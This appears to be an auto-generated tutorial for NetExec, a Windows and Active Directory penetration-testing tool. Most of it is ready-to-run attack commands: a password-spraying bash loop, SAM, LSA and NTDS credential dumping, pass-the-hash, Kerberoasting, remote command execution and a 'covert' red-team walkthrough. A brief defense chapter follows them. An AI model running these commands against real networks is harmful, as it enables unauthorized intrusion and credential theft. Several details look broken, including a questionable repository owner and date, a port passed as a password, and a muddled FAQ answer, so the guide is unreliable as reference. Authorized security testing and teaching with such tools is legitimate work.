---
tool_name: "netexec"
display_name: "NetExec"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install netexec"
version: "1.1.0"
github_repo: "https://github.com/Penntest-docker/NetExec"
kali_tools_page: "https://www.kali.org/tools/netexec/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["network", "smb", "ldap", "winrm", "active-directory", "post-exploitation"]
related_tools: ["crackmapexec", "impacket", "evil-winrm"]
---

# NetExec

## Chapter 1: Introduction & Overview

### What is NetExec?
NetExec (nxc) is a fork of CrackMapExec with additional features and improvements. It's a Swiss army knife for pentesting Windows/Active Directory environments.

### History & Background
- **Created:** 2022 by Penntest-docker
- **Maintained:** Penntest-docker
- **License:** BSD License
- **Purpose:** Network penetration testing

NetExec is the next generation of CrackMapExec with enhanced features.

### When to Use This Tool
- **Network penetration testing:** Enumerate and attack Windows networks
- **Credential testing:** Test password strength
- **Lateral movement:** Move through networks
- **Post-exploitation:** Execute commands on compromised systems

### Key Concepts
- **Protocol:** SMB, LDAP, WINRM, SSH, FTP, etc.
- **Credential Attacks:** Password spraying, Pass-the-Hash, etc.
- **Command Execution:** Run commands on remote systems
- **Enumeration:** Gather information from targets

### Differences from CrackMapExec
| Feature | CrackMapExec | NetExec |
|---------|--------------|---------|
| Active Development | Maintenance mode | Active |
| New Protocols | Limited | Added DCOM, SMBv1 |
| Performance | Standard | Improved |
| Output | Basic | Enhanced |

---

## Chapter 2: Installation & Setup

### System Requirements
- **RAM:** 2 GB minimum
- **Disk Space:** ~50 MB
- **Privileges:** User-level (for most features)

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install netexec
```

#### Method 2: Pipx
```bash
pipx install netexec
```

#### Method 3: From Source
```bash
git clone https://github.com/Penntest-docker/NetExec.git
cd NetExec
pip install .
```

### Verification
```bash
nxc --version
# or
netexec --version
```

---

## Chapter 3: Basic Usage

### First Scan

#### SMB Scan
```bash
nxc smb 192.168.1.0/24
```
**Output:** Shows SMB hosts and basic info.

#### Credential Test
```bash
nxc smb 192.168.1.0/24 -u admin -p password123
```
**Output:** Shows which hosts accept the credentials.

### Essential Commands

#### SMB Enumeration
```bash
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```
**Explanation:** Generates list of hosts vulnerable to relay attacks.

#### Command Execution
```bash
nxc smb 192.168.1.0/24 -u admin -p password123 -x "whoami"
```
**Explanation:** Executes command on all hosts where credentials work.

#### Credential Dumping
```bash
nxc smb 192.168.1.1 -u admin -p password123 --lsa
```
**Explanation:** Dumps LSA secrets from target.

### Complete Flags Reference

#### Target Specification
| Flag | Description | Example |
|------|-------------|---------|
| `protocol://target` | Target specification | `smb://192.168.1.0/24` |
| `-t` | Thread count | `nxc smb 192.168.1.0/24 -t 100` |
| `--timeout` | Connection timeout | `nxc smb 192.168.1.0/24 --timeout 10` |

#### Authentication
| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Username | `nxc smb target -u admin` |
| `-p` | Password | `nxc smb target -u admin -p pass` |
| `-H` | NTLM hash | `nxc smb target -u admin -H 'aad3b435b51404ee...'` |
| `-k` | Kerberos | `nxc smb target -k` |
| `--shares` | Enumerate shares | `nxc smb target -u admin -p pass --shares` |
| `--sam` | Dump SAM | `nxc smb target -u admin -p pass --sam` |
| `--lsa` | Dump LSA | `nxc smb target -u admin -p pass --lsa` |
| `--ntds` | Dump NTDS | `nxc smb target -u admin -p pass --ntds` |

#### Command Execution
| Flag | Description | Example |
|------|-------------|---------|
| `-x` | Execute command | `nxc smb target -x "whoami"` |
| `-X` | PowerShell command | `nxc smb target -X "Get-Process"` |

#### SMB Options
| Flag | Description | Example |
|------|-------------|---------|
| `--gen-relay-list` | Generate relay targets | `nxc smb target --gen-relay-list targets.txt` |
| `--smb-server` | Start SMB server | `nxc smb target --smb-server /share` |
| `--smb-timeout` | SMB timeout | `nxc smb target --smb-timeout 10` |

#### LDAP Options
| Flag | Description | Example |
|------|-------------|---------|
| `--ldap-base` | LDAP base DN | `nxc ldap target --ldap-base "DC=domain,DC=local"` |
| `--ldap-filter` | LDAP filter | `nxc ldap target --ldap-filter "(objectClass=user)"` |
| `--bloodhound` | BloodHound collection | `nxc ldap target --bloodhound -u admin -p pass` |

#### WINRM Options
| Flag | Description | Example |
|------|-------------|---------|
| `--exec-method` | Execution method | `nxc winrm target --exec-method cmd` |
| `--remote-ps` | PS Remoting | `nxc winrm target --remote-ps` |

#### Output Options
| Flag | Description | Example |
|------|-------------|---------|
| `-o` | Output file | `nxc smb target -o results.txt` |
| `-v` | Verbose | `nxc smb target -v` |
| `-vv` | Very verbose | `nxc smb target -vv` |

---

## Chapter 4: Intermediate Usage

### Advanced Enumeration

#### SMB Enumeration
```bash
# Enumerate shares
nxc smb 192.168.1.0/24 -u admin -p pass --shares

# Enumerate users
nxc smb 192.168.1.0/24 -u admin -p pass --users

# Enumerate groups
nxc smb 192.168.1.0/24 -u admin -p pass --groups

# Enumerate local groups
nxc smb 192.168.1.0/24 -u admin -p pass --local-groups

# Password policy
nxc smb 192.168.1.0/24 -u admin -p pass --password-policy
```

#### LDAP Enumeration
```bash
# LDAP queries
nxc ldap 192.168.1.0/24 -u admin -p pass --groups

# BloodHound collection
nxc ldap 192.168.1.0/24 -u admin -p pass --bloodhound

# KERBEROAST
nxc ldap 192.168.1.0/24 -u admin -p pass --kerberoast hashes.txt
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Credential spray
SUBNET="192.168.1"
USERS=("admin" "administrator" "user1" "user2")
PASSWORDS=("password123" "Password1" "admin" "password")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[*] Testing $user:$pass"
        nxc smb $SUBNET.0/24 -u $user -p $pass --shares 2>/dev/null | grep "[+]" >> valid_creds.txt
    done
done
```

#### Python Scripting
```python
#!/usr/bin/env python3
import subprocess

def nxc_scan(protocol, target, username, password, options=None):
    """Run NetExec scan"""
    cmd = f"nxc {protocol} {target} -u {username} -p {password}"
    if options:
        cmd += f" {options}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

# Scan SMB
output = nxc_scan("smb", "192.168.1.0/24", "admin", "password123", "--shares")
print(output)
```

### Combining with Other Tools

#### With Impacket
```bash
# Use captured hashes
nxc smb 192.168.1.1 -u admin -H 'aad3b435b51404ee...'

# Then use impacket
impacket-psexec domain/admin:password@192.168.1.1
```

#### With Evil-WinRM
```bash
# Use found credentials
evil-winrm -i 192.168.1.1 -u admin -p password
```

### Advanced Configurations

#### Credential Files
```bash
# Username list
nxc smb 192.168.1.0/24 -U users.txt -p password

# Username:Password list
nxc smb 192.168.1.0/24 -C creds.txt
```

### Performance Optimization

#### Increase Threads
```bash
nxc smb 192.168.1.0/24 -t 100
```

#### Reduce Timeout
```bash
nxc smb 192.168.1.0/24 --timeout 5
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### Pass-the-Hash
```bash
# Use NTLM hash
nxc smb 192.168.1.0/24 -u admin -H 'aad3b435b51404ee...'
```

#### Overpass-the-Hash
```bash
# Use NTLM hash for Kerberos
nxc smb 192.168.1.0/24 -u admin -H 'aad3b435b51404ee...' --export-kerberos ticket.kirbi
```

### Integration in Pentest Workflow

#### Phase 1: Enumeration
```bash
# Find SMB hosts
nxc smb 192.168.1.0/24

# Enumerate shares
nxc smb 192.168.1.0/24 -u admin -p pass --shares
```

#### Phase 2: Credential Testing
```bash
# Test default creds
nxc smb 192.168.1.0/24 -u admin -p password

# Test common passwords
nxc smb 192.168.1.0/24 -U users.txt -p passwords.txt
```

#### Phase 3: Lateral Movement
```bash
# Execute commands
nxc smb 192.168.1.1 -u admin -p pass -x "whoami"

# Dump credentials
nxc smb 192.168.1.1 -u admin -p pass --sam
```

### Advanced Configurations

#### Custom SMB Server
```bash
# Start SMB server for hash capture
nxc smb 192.168.1.0/24 --smb-server /share
```

### Performance Optimization

#### Parallel Execution
```bash
nxc smb 192.168.1.0/24 -t 200
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Find valid credentials

**Steps:**
```bash
# 1. Enumerate SMB
nxc smb 192.168.1.0/24

# 2. Test default creds
nxc smb 192.168.1.0/24 -u admin -p password

# 3. Find valid creds
nxc smb 192.168.1.0/24 -U users.txt -p passwords.txt

# 4. Use found creds
nxc smb 192.168.1.1 -u admin -p pass --shares
```

### Scenario 2: Penetration Test
**Objective:** Compromise Windows network

**Steps:**
```bash
# 1. Enumerate network
nxc smb 192.168.1.0/24

# 2. Credential spray
nxc smb 192.168.1.0/24 -U users.txt -p passwords.txt

# 3. Execute commands
nxc smb 192.168.1.1 -u admin -p pass -x "whoami"

# 4. Dump credentials
nxc smb 192.168.1.1 -u admin -p pass --sam --lsa

# 5. Lateral movement
```

### Scenario 3: Red Team Operation
**Objective:** Covert network compromise

**Steps:**
```bash
# 1. Stealth enumeration
nxc smb 192.168.1.0/24 -t 10 --timeout 10

# 2. Limited credential testing
nxc smb 192.168.1.0/24 -u admin -p pass

# 3. Targeted execution
nxc smb 192.168.1.1 -u admin -p pass -x "whoami"
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect NetExec

#### Network Indicators
```
# Multiple SMB connections
# LDAP enumeration patterns
# WinRM connections from unusual sources
```

#### Log Analysis
```bash
# Windows Event Logs
# Event ID 4624 - Logon
# Event ID 4625 - Failed logon
# Event ID 4768 - Kerberos TGT
```

### Mitigation Strategies

#### Account Lockout
```bash
# Configure lockout policy
# Limit failed logon attempts
```

#### Monitor for Enumeration
```bash
# Monitor LDAP queries
# Watch for SMB enumeration
# Alert on unusual WinRM connections
```

### Blue Team Response
1. **Implement account lockout** - Prevent password spraying
2. **Monitor LDAP queries** - Detect enumeration
3. **Use strong passwords** - Resist brute force
4. **Enable logging** - Track all authentication attempts
5. **Segment network** - Limit lateral movement

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Connection refused"
**Cause:** Service not running
**Solution:**
```bash
# Check if service is running
nmap -p 445 target

# Try different protocol
nxc smb target -p 445
```

#### Error: "Access denied"
**Cause:** Invalid credentials
**Solution:**
```bash
# Verify credentials
nxc smb target -u admin -p password

# Try different credentials
nxc smb target -U users.txt -p passwords.txt
```

### Performance Optimization

#### Slow Scans
```bash
# Increase threads
nxc smb 192.168.1.0/24 -t 100

# Reduce timeout
nxc smb 192.168.1.0/24 --timeout 5
```

### FAQ

**Q: Is netexec legal to use?**
A: Yes, netexec is a legitimate security testing tool. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I update netexec?**
A: `sudo apt update && sudo apt upgrade netexec`

**Q: What's the difference between netexec and crackmapexec?**
A: NetExec is a fork of CrackMapExec with additional features and active development.

**Q: Can I use netexec on Linux?**
A: Yes, netexec works on Linux systems with SSH.

**Q: How do I test Kerberos authentication?**
A: Use `-k` flag: `nxc smb target -k`

---

## Resources

### Official Documentation
- [NetExec GitHub](https://github.com/Penntest-docker/NetExec)
- [NetExec Wiki](https://github.com/Penntest-docker/NetExec/wiki)

### Tutorials
- [NetExec Tutorial - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/crackmapexec)
- [NetExec Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Related Tools
- **crackmapexec:** Original tool (maintenance mode)
- **impacket:** Python network toolkit
- **evil-winrm:** Windows Remote Management shell
- **smbclient:** SMB client

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
